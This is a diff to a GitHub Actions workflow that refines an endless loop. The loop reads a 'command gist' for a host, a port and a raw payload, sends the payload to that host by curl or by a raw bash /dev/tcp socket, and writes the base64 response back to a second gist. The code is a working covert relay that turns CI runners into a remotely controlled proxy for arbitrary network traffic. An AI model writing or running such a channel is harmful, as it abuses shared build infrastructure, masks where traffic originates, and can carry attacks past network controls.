@@ -21,41 +21,15 @@ jobs:
           echo "Response Gist: $RESPONSE_GIST_ID"
           echo "========================================"
           
-          # Test 1: curl to api.github.com/zen
-          echo "[$(date -u +%H:%M:%S)] Test 1: curl api.github.com/zen"
-          ZEN=$(curl -s --max-time 10 "https://api.github.com/zen" 2>&1)
-          echo "Result: $ZEN"
-          echo "Exit code: $?"
-          
-          # Test 2: curl to github.com
-          echo "[$(date -u +%H:%M:%S)] Test 2: curl github.com"
-          curl -s --max-time 10 -o /dev/null -w "HTTP %{http_code}\n" "https://github.com" 2>&1
-          echo "Exit code: $?"
-          
-          # Test 3: curl to example.com
-          echo "[$(date -u +%H:%M:%S)] Test 3: curl example.com"
-          curl -s --max-time 10 -o /dev/null -w "HTTP %{http_code}\n" "https://example.com" 2>&1
-          echo "Exit code: $?"
-          
-          # Test 4: gh api
-          echo "[$(date -u +%H:%M:%S)] Test 4: gh api"
-          timeout 15 gh api "gists/$COMMAND_GIST_ID" 2>&1 | head -c 200
-          echo ""
-          echo "Exit code: $?"
-          
-          echo "[$(date -u +%H:%M:%S)] Tests complete"
+          # API helper using curl (works fine on Azure runner)
+          api() {
+            curl -s -H "Authorization: token $GH_TOKEN" "$@"
+          }
           
           # Main polling loop
           while true; do
-            # Fetch command gist using gh
-            GIST=$(timeout 15 gh api "gists/$COMMAND_GIST_ID" 2>/dev/null || echo "")
-            
-            if [ -z "$GIST" ]; then
-              echo "[$(date -u +%H:%M:%S)] Failed to fetch command gist, retrying..."
-              sleep 5
-              continue
-            fi
-            
+            # Fetch command gist
+            GIST=$(api "https://api.github.com/gists/$COMMAND_GIST_ID")
             RAW_URL=$(echo "$GIST" | jq -r '.files["command.json"].raw_url // empty')
             
             if [ -z "$RAW_URL" ]; then
@@ -63,8 +37,7 @@ jobs:
               continue
             fi
             
-            # Fetch raw content using gh
-            DATA=$(timeout 15 gh api "$RAW_URL" 2>/dev/null || echo "")
+            DATA=$(api "$RAW_URL")
             JOB_ID=$(echo "$DATA" | jq -r '.id // empty')
             
             if [ -z "$JOB_ID" ]; then
@@ -93,31 +66,36 @@ jobs:
               PAYLOAD=""
             fi
             
-            # For HTTP (port 80), use curl directly (more reliable)
+            # For HTTP/HTTPS, use curl (much more reliable than /dev/tcp)
             RESPONSE=""
             if [ "$PORT" = "80" ] || [ "$PORT" = "443" ]; then
               PROTO="http"
               [ "$PORT" = "443" ] && PROTO="https"
+              
+              # Extract path from HTTP request payload
+              HTTP_PATH="/"
               if [ -n "$PAYLOAD" ]; then
                 HTTP_PATH=$(echo "$PAYLOAD" | head -1 | awk '{print $2}')
                 [ -z "$HTTP_PATH" ] && HTTP_PATH="/"
-                FULL_URL="${PROTO}://${HOST}${HTTP_PATH}"
-                echo "[$(date -u +%H:%M:%S)] Fetching: $FULL_URL"
-                RESPONSE=$(timeout 30 curl -sS -D - "$FULL_URL" 2>&1 || echo "CURL_ERROR: $?")
-              else
-                FULL_URL="${PROTO}://${HOST}/"
-                RESPONSE=$(timeout 30 curl -sS -D - "$FULL_URL" 2>&1 || echo "CURL_ERROR: $?")
               fi
+              
+              FULL_URL="${PROTO}://${HOST}${HTTP_PATH}"
+              echo "[$(date -u +%H:%M:%S)] Fetching: $FULL_URL"
+              
+              # Use curl with headers and body
+              RESPONSE=$(curl -sS --max-time 30 -D - "$FULL_URL" 2>&1 || echo "CURL_ERROR: $?")
+              echo "[$(date -u +%H:%M:%S)] Response size: $(echo "$RESPONSE" | wc -c) bytes"
             else
-              if timeout 10 bash -c "echo >/dev/tcp/$HOST/$PORT" 2>/dev/null; then
+              # For non-HTTP ports, use bash /dev/tcp
+              if timeout 30 bash -c "echo >/dev/tcp/$HOST/$PORT" 2>/dev/null; then
                 exec 3<>/dev/tcp/$HOST/$PORT 2>/dev/null || true
                 if [ -n "$PAYLOAD" ]; then
                   printf '%s' "$PAYLOAD" >&3 2>/dev/null || true
                 fi
-                RESPONSE=""
-                while IFS= read -r -t 3 line <&3 2>/dev/null || [ -n "$line" ]; do
+                # Read response with timeout
+                while IFS= read -r -t 5 line || [ -n "$line" ]; do
                   RESPONSE+="$line"$'\n'
-                done
+                done <&3 2>/dev/null || true
                 exec 3>&- 2>/dev/null || true
               fi
             fi
@@ -131,10 +109,10 @@ jobs:
               --arg resp "$RESPONSE_B64" \
               '{id: $id, response: $resp}')
             
-            # Update response gist using gh
-            echo "$RESPONSE_JSON" > /tmp/response_payload.json
-            timeout 15 gh api --method PATCH "gists/$RESPONSE_GIST_ID" \
-              --input /tmp/response_payload.json > /dev/null 2>&1
+            # Update response gist
+            ESCAPED=$(printf '%s' "$RESPONSE_JSON" | jq -Rs .)
+            api --request PATCH "https://api.github.com/gists/$RESPONSE_GIST_ID" \
+              -d "{\"files\":{\"response.json\":{\"content\":$ESCAPED}}}" > /dev/null 2>&1
             
             echo "[$(date -u +%H:%M:%S)] Response sent for job: $JOB_ID ($(echo "$RESPONSE" | wc -c) bytes)"
             sleep 1
